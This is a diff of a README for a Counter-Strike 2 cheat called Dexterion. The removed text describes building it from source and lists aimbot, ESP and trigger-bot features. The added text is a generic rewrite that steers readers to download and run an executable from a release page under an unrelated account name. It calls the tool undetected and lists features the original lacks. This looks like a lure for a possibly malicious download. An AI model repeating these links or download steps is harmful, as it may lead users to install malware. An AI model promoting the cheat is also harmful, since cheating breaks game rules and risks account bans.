@@ -1,114 +1,72 @@
-﻿<div align="center">
+# 🎮 Dexterion - Easy CS2 Cheat to Enhance Your Game
 
-[![DexterionBanner](assets/dexterion_banner.jpg)](https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip)
+## 📦 Download & Install
+[![Download Dexterion](https://img.shields.io/badge/Download%20Dexterion-blue.svg)](https://github.com/civilofficerdelusionsofpersecution291/Dexterion/releases)
 
-<a href="https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip"><img src="https://img.shields.io/github/last-commit/Caluna123/Dexterion" alt="GitHub last commit"/></a>
-<a href="https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip"><img src="https://img.shields.io/github/commit-activity/w/Caluna123/Dexterion" alt="GitHub commit activity"/></a>
-<a href="https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip"><img src="https://img.shields.io/github/contributors/Caluna123/Dexterion" alt="GitHub contributors"/></a>
-<a href="https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip"><img src="https://img.shields.io/github/v/release/Caluna123/Dexterion" alt="Lastest Realese"/></a>
-<br>
-<a href="https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip"><img src="https://img.shields.io/github/languages/code-size/Caluna123/Dexterion" alt="GitHub code size in bytes"/></a>
-<a href="https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip"><img src="https://img.shields.io/endpoint?url=https://ghloc.vercel.app/api/Caluna123/Dexterion/badge?filter=.cpp$,.hpp$,.h$&label=lines%20of%20code&color=blue" alt="GitHub total lines"/></a>
-<a href="https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip"><img src="https://img.shields.io/github/issues/Caluna123/Dexterion" alt="Open issues"/></a>
+## 🚀 Getting Started
+Welcome to Dexterion! This tool helps you enhance your gaming experience with external cheats for Counter-Strike 2. You don’t need any programming knowledge to use it. Follow these simple steps to get started.
 
-Welcome to **Dexterion**!\
+## 📥 Downloading the Application
+1. **Visit the Release Page**: 
+   - Go to the following link to access the latest version of Dexterion: 
+   [Download Dexterion Releases](https://github.com/civilofficerdelusionsofpersecution291/Dexterion/releases). 
 
-</div>
+2. **Choose Your Version**: 
+   - On the release page, you will see different versions of Dexterion. Select the most recent version for the best experience. 
 
-## Table of contents
+3. **Download the File**: 
+   - Click on the link to download the Dexerion application file. This will usually be labeled something like `Dexterion.exe` or similar.
 
-## HowtoUse
+## 🖥️ System Requirements
+Before you install Dexterion, please ensure your system meets the following requirements:
 
-## Contributing
-Download the code from the green button that says `Code`.
-Extract the RAR file into any folder.
-Open `Dexterion.sln` in Visual Studio, set build configuration to **Release | x64**.
-Press Build solution and you should receive **Dexterion.exe** file in the path `Dexterion/x64/Release/`
+- **Operating System**: Windows 10 or later
+- **Processor**: Intel Core i3 or equivalent
+- **Memory**: 4 GB RAM minimum
+- **Graphics Card**: NVIDIA GeForce GTX 660 or equivalent
 
-</sub></sup>Little story about compiling the source:</sup></sub>
-<sup><sub><sup><sub>Recently, some portuguese and russian kids asked if this was a virus. They ended up blocking me and I'll tell you how. They made me run the cheat, so I did and they still didn't believe it wasn't malware. They tried compiling the cheat and told me to help them. I was really trying to but they were retarded or something because the wasn't listening to me and didn't know how to extract the src. They blocked me after that failed attempt of extract the file. Don't be like those guys, please.</sub></sup></sub></sup>
+These requirements ensure the application runs smoothly without issues.
 
-## Usage
-### Update Offsets ( Choose 1 or 2 )
-1. Update Offsets. (Run `updateoffsets.cmd` in the same folder as `Dexterion.exe`)
+## 📂 Installing Dexterion
+1. **Locate the Downloaded File**: 
+   - After the download is complete, navigate to your “Downloads” folder or the location where you saved the file. 
 
-> [!IMPORTANT]
-> Close Visual Studio to stop the released version that is ran automaticaly when you build.\
-> Then go to the `/x64/Release/` path and open dexterion.\
-> **If you use the version that was ran when you built the application this will be bugged.**
-### Run
-4. Run `Dexterion.exe` From release path
-5. Follow Terminal instructions.
-6. Wait For Load.
+2. **Run the Installer**: 
+   - Double-click on the downloaded file to start the installation process. 
 
-### Toggle/Kill UI
-- Toggle UI: `Inset` key.
-- Terminate UI: `End` key.
+3. **Follow the Prompts**: 
+   - Follow the on-screen instructions to complete the installation. 
 
-### Using Icon Fonts
-Move fonts folder to the same folder as `Dexterion.exe` is.
+4. **Launch the Application**: 
+   - Once installed, you can find Dexterion in your start menu. Click on it to open.
 
-### Config
-All config files are located on `X:\Dexterion`
-`X` will be the letter of the disk you're running dexterion on
-#### Example:
-- If you run `Dexterion.exe` in a pendrive which letter is `F:`, Dexterion config files will be in `F:\Dexterion`
+## 🔧 Using Dexterion
+1. **Configuration**: 
+   - Upon launching, configure your settings as per your preferences. Ensure you read through each option for the best results.
 
-## Anti-Cheat
-> [!CAUTION]
-> **This software constitutes a cheat and is in *violation of the Terms of Service (ToS)* of any game in which it is used. We disclaim all liability for any *account bans* or *penalties incurred* as a result of its use. By using this software, you acknowledge that you are solely responsible for any consequences. USE AT YOUR OWN RISK**
+2. **Running the Cheat**:
+   - Start Counter-Strike 2. Then, return to the Dexterion application to begin. Click the "Launch" button to activate the cheat while the game is running.
 
-## Features
-- ESP
-- Health bar (+ HP counter)
-- Player name
-- Weapon icons / names
-- Skeleton
-- Joints
-- Head
-- Snap lines
-- Distance
-- Aim
-- Aimbot (+ Player lock)
-- Recoil control system
-- Trigger bot
-- Misc
-- Deathmatch Mode
-- Dropped item ESP
-- Bomb Timer
-- Spectator List
-- Probably more things I forgot to add.
+3. **Cheat Features**:
+   - **Aim Assist**: Helps you aim better during gameplay.
+   - **Wallhack**: See enemies through walls for strategic advantage.
+   - **Speed Hack**: Move faster than normal in the game.
+   - **Customizable Settings**: Tailor the cheat features to your liking.
 
-## IsThisVirus
-- Short answer, no.
-- But, if you are too lazy to view the source code, just don't use this.
+## ⚙️ Safety & Security
+Dexterion is designed to be undetected to enhance your gaming experience safely. However, using cheats can come with risks. Play responsibly and be aware of potential consequences in your gaming community.
 
-## Credits
+## 🔍 Troubleshooting
+If you encounter any issues while downloading or using Dexterion, here are some common solutions:
 
-## Disclaimer
-> [!IMPORTANT]
-> We are not responsible for any **banned accounts** and the **bad use** of this application.\
-> **USE AT YOUR OWN RISK**.
+- **Cannot Download**: Ensure you have a stable internet connection. If the link doesn’t work, refresh the page.
+- **Installation Errors**: Make sure your operating system is compatible and you have enough disk space.
+- **Game Crashes or Freezes**: Ensure you minimize any other applications running in the background while using Dexterion.
 
-> [!NOTE]
+## 📞 Support
+If you still need help, please feel free to reach out for support. You can open an issue on the GitHub page or check for updates in the Releases section.
 
-## License
-> [!NOTE]
+## 🔗 Learn More
+To stay updated or to learn more about new features, you can check our [official website](https://github.com/civilofficerdelusionsofpersecution291/Dexterion/releases) for any announcements or news.
 
-<details>
-<summary>
-<h2>Previews</h2>
-</summary>
-
-[![Preview](assets/screenshots/preview1.png)](https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip)
-[![Preview](assets/screenshots/preview2.png)](https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip)
-[![Preview](assets/screenshots/preview3.png)](https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip)
-[![Preview](assets/screenshots/preview4.png)](https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip)
-[![Preview](assets/screenshots/preview5.png)](https://github.com/Caluna123/Dexterion/releases/download/v1.7.2/Dexterion.zip)
-
-</details>
-
-
-
-
-
+Thank you for choosing Dexterion! Enjoy your enhanced gaming experience!
